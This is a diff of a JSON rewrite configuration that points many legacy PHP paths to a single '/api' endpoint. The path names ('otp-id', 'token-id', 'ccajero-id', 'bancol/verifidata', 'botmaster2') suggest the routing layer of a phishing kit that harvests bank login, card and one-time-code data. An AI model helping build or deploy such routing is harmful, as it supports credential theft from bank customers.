@@ -16,75 +16,75 @@
     },
     {
       "source": "/load.php",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/load",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/datos.php",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/datos",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/flys.php",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/flys",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/loadtiketid.php",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/loadtiketid",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/checking.php",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/checking",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/dinadatos/cargando.php",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/dinadatos/botmaster2.php",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/dinadatos/ccajero-id.php",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/dinadatos/dinamica-id.php",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/dinadatos/error-id.php",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/dinadatos/otp-id.php",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/dinadatos/token-id.php",
-      "destination": "/api/index.php"
+      "destination": "/api"
     },
     {
       "source": "/dinadatos/bancol/verifidata.php",
-      "destination": "/api/index.php"
+      "destination": "/api"
     }
   ]
 }
